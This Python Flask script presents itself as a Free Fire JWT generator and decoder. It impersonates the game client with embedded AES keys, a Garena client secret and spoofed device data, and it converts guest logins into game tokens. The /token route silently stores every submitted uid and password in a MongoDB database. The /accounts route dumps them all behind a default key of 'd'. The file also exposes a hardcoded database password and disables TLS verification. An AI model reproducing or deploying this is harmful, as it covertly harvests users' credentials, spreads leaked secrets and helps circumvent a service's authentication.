#!/usr/bin/env python3
"""
Free Fire JWT Generator + Decoder
JWT decode: @MaiKahaSeAaya | @DGGAMIMG1MPRO
API Owner: @dggaming1mpro
"""

import base64
import json
import os
import time
import secrets
from datetime import datetime

from flask import Flask, request, jsonify
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from pymongo import MongoClient

import my_pb2
import output_pb2

app = Flask(__name__)

# ─── AES Keys ───────────────────────────────────────────────────────────────
KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV  = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

# ─── Nickname XOR Secret ────────────────────────────────────────────────────
NICK_SECRET = b"1e5898ccb8dfdd921f9beca848768"

# ─── API Secret Key (for /accounts endpoint) ────────────────────────────────
API_SECRET = os.environ.get("API_SECRET", "d")

# ─── MongoDB ────────────────────────────────────────────────────────────────
MONGO_URI = "mongodb+srv://starzzff08:wrh2PeQrdxSloNGC@cluster0.qnfxnzm.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["jwt"]
accounts_col = db["accounts"]

# uid+password unique index — ek baar hi save hoga
accounts_col.create_index([("uid", 1), ("password", 1)], unique=True)

SESSION = requests.Session()


# ════════════════════════════════════════════════════════════════════════════
# Logging helpers
# ════════════════════════════════════════════════════════════════════════════
def log_info(msg):  print(f"[INFO]  {msg}")
def log_error(msg): print(f"[ERROR] {msg}")
def log_debug(msg): print(f"[DEBUG] {msg}")


# ════════════════════════════════════════════════════════════════════════════
# Nickname Decoder
# ════════════════════════════════════════════════════════════════════════════
def decode_nickname(encoded: str) -> str:
    try:
        raw = base64.b64decode(encoded)
        dec = bytearray()
        for i, b in enumerate(raw):
            dec.append(b ^ NICK_SECRET[i % len(NICK_SECRET)])
        return dec.decode("utf-8")
    except Exception as e:
        return f"[DECODE_ERROR: {e}]"


# ════════════════════════════════════════════════════════════════════════════
# JWT Decoder
# ════════════════════════════════════════════════════════════════════════════
def decode_jwt(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "Invalid JWT format"}
        payload_b64 = parts[1]
        payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode("utf-8"))

        # Decode nickname in-place
        if "nickname" in payload and isinstance(payload["nickname"], str):
            payload["nickname"] = decode_nickname(payload["nickname"])

        return payload
    except Exception as e:
        return {"error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
# Garena / FF Auth helpers
# ════════════════════════════════════════════════════════════════════════════
def getGuestAccessToken(uid, password):
    headers = {
        "Host": "100067.connect.garena.com",
        "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }
    data = {
        "uid": str(uid),
        "password": str(password),
        "response_type": "token",
        "client_type": "2",
        "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
        "client_id": "100067"
    }
    response = SESSION.post(
        "https://100067.connect.garena.com/oauth/guest/token/grant",
        headers=headers, data=data, verify=False
    )
    dr = response.json()
    if dr.get("success") is True:
        if dr.get("response", {}).get("error") == "auth_error":
            return {"error": "auth_error"}
    return {
        "access_token": dr.get("access_token"),
        "open_id": dr.get("open_id")
    }


def check_guest(uid, password):
    token_data = getGuestAccessToken(uid, password)
    if token_data.get("error") == "auth_error":
        return uid, None, None, True
    access_token = token_data.get("access_token")
    open_id = token_data.get("open_id")
    if access_token and open_id:
        log_debug(f"UID {uid}: access_token + open_id OK")
        return uid, access_token, open_id, False
    log_error(f"UID {uid}: login failed, token missing")
    return uid, None, None, False


def get_token_inspect_data(access_token):
    try:
        resp = SESSION.get(
            f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
            timeout=15, verify=False
        )
        data = resp.json()
        if "open_id" in data and "platform" in data and "uid" in data:
            return data
    except Exception as e:
        log_error(f"Token inspect error: {e}")
    return None


def login(uid, access_token, open_id, platform_type):
    url = "https://loginbp.ggblueshark.com/MajorLogin"
    game_data = my_pb2.GameData()
    game_data.timestamp      = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    game_data.game_name      = "Free Fire"
    game_data.game_version   = 1
    game_data.version_code   = "1.120.2"
    game_data.os_info        = "iOS 18.4"
    game_data.device_type    = "Handheld"
    game_data.network_provider = "Verizon Wireless"
    game_data.connection_type  = "WIFI"
    game_data.screen_width   = 1170
    game_data.screen_height  = 2532
    game_data.dpi            = "460"
    game_data.cpu_info       = "Apple A15 Bionic"
    game_data.total_ram      = 6144
    game_data.gpu_name       = "Apple GPU (5-core)"
    game_data.gpu_version    = "Metal 3"
    game_data.user_id        = uid
    game_data.ip_address     = "172.190.111.97"
    game_data.language       = "en"
    game_data.open_id        = open_id
    game_data.access_token   = access_token
    game_data.platform_type  = platform_type
    game_data.field_99       = str(platform_type)
    game_data.field_100      = str(platform_type)

    serialized  = game_data.SerializeToString()
    padded      = pad(serialized, AES.block_size)
    cipher      = AES.new(KEY, AES.MODE_CBC, IV)
    encrypted   = cipher.encrypt(padded)

    headers = {
        "User-Agent":      "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
        "Connection":      "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Type":    "application/octet-stream",
        "Expect":          "100-continue",
        "X-GA":            "v1 1",
        "X-Unity-Version": "2018.4.11f1",
        "ReleaseVersion":  "OB53",
        "Content-Length":  str(len(encrypted))
    }

    try:
        response = SESSION.post(url, data=encrypted, headers=headers, timeout=30, verify=False)
        if response.status_code == 200:
            jwt_msg = output_pb2.Garena_420()
            jwt_msg.ParseFromString(response.content)
            if jwt_msg.token:
                log_debug(f"Login OK for UID {uid}")
                return jwt_msg.token
        else:
            err_text = response.content.decode().strip()
            log_debug(f"MajorLogin {response.status_code}: {err_text}")
            if err_text == "BR_PLATFORM_INVALID_PLATFORM":
                return {"error": "INVALID_PLATFORM", "message": "this account is registered on another platform"}
            elif err_text == "BR_GOP_TOKEN_AUTH_FAILED":
                return {"error": "INVALID_TOKEN", "message": "AccessToken invalid."}
            elif err_text == "BR_PLATFORM_INVALID_OPENID":
                return {"error": "INVALID_OPENID", "message": "OpenID invalid."}
    except Exception as e:
        log_error(f"UID {uid}: JWT request error - {e}")
    return None


# ════════════════════════════════════════════════════════════════════════════
# MongoDB helper
# ════════════════════════════════════════════════════════════════════════════
def save_account(uid, password):
    """Save uid+password to MongoDB (no duplicates)."""
    try:
        accounts_col.update_one(
            {"uid": int(uid), "password": str(password)},
            {"$setOnInsert": {"uid": int(uid), "password": str(password), "created_at": datetime.utcnow()}},
            upsert=True
        )
        log_debug(f"Account saved/exists: UID {uid}")
    except Exception as e:
        log_error(f"MongoDB save error: {e}")


def build_final_response(jwt_token: str, uid, password) -> dict:
    """Decode JWT and return clean final response."""
    payload = decode_jwt(jwt_token)

    # Force lock_region from decoded region or default "IND"
    region = payload.get("lock_region") or payload.get("region") or "IND"

    return {
        "success": True,
        "status": "live",
        "token": jwt_token,
        "decoded": {
            "account_id": payload.get("account_id") or payload.get("uid") or uid,
            "nickname":   payload.get("nickname", ""),
            "region": region,
        },
        "api_owner": "@dggaming1mpro"
    }


# ════════════════════════════════════════════════════════════════════════════
# Routes
# ════════════════════════════════════════════════════════════════════════════

@app.route("/token", methods=["GET"])
def get_jwt():
    guest_uid      = request.args.get("uid")
    guest_password = request.args.get("password")

    # ── Mode 1: uid + password ───────────────────────────────────────────
    if guest_uid and guest_password:
        uid, access_token, open_id, err_flag = check_guest(guest_uid, guest_password)

        if err_flag:
            return jsonify({"success": False, "message": "invalid guest_uid / guest_password", "api_owner": "@dggaming1mpro"}), 400

        if not access_token or not open_id:
            return jsonify({"success": False, "message": "unregistered or banned account.", "detail": "jwt not found in response.", "api_owner": "@dggaming1mpro"}), 500

        jwt_token = login(uid, access_token, open_id, 4)

        if isinstance(jwt_token, dict):
            jwt_token["api_owner"] = "@dggaming1mpro"
            return jsonify(jwt_token), 400

        if not jwt_token:
            return jsonify({"success": False, "message": "unregistered or banned account.", "detail": "jwt not found in response.", "api_owner": "@dggaming1mpro"}), 500

        # Save to MongoDB
        save_account(guest_uid, guest_password)

        return jsonify(build_final_response(jwt_token, guest_uid, guest_password))

    # ── Mode 2: access_token ─────────────────────────────────────────────
    access_token = request.args.get("access_token")
    if access_token:
        token_data = get_token_inspect_data(access_token)
        if not token_data:
            return jsonify({"error": "INVALID_TOKEN", "message": "AccessToken invalid.", "api_owner": "@dggaming1mpro"}), 400

        open_id       = token_data["open_id"]
        platform_type = token_data["platform"]
        uid           = str(token_data["uid"])

        jwt_token = login(uid, access_token, open_id, platform_type)

        if isinstance(jwt_token, dict):
            jwt_token["api_owner"] = "@dggaming1mpro"
            return jsonify(jwt_token), 400

        if not jwt_token:
            return jsonify({"success": False, "message": "unregistered or banned account.", "detail": "jwt not found in response.", "api_owner": "@dggaming1mpro"}), 500

        return jsonify(build_final_response(jwt_token, uid, None))

    return jsonify({"success": False, "message": "missing access_token (or uid + password)", "api_owner": "@dggaming1mpro"}), 400


# ── View all saved accounts (secret key protected) ────────────────────────
@app.route("/accounts", methods=["GET"])
def view_accounts():
    key = request.args.get("key")
    if key != API_SECRET:
        return jsonify({"error": "Unauthorized. Provide ?key=<secret>", "api_owner": "@dggaming1mpro"}), 401

    docs = list(accounts_col.find({}, {"_id": 0, "uid": 1, "password": 1, "created_at": 1}))
    return jsonify({
        "total": len(docs),
        "accounts": docs,
        "api_owner": "@dggaming1mpro"
    })


@app.errorhandler(404)
def not_found(error):
    return jsonify({"detail": "Not Found", "api_owner": "@dggaming1mpro"}), 404


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5001))
    log_info(f"Starting service on port {port}")
    app.run(host="0.0.0.0", port=port)
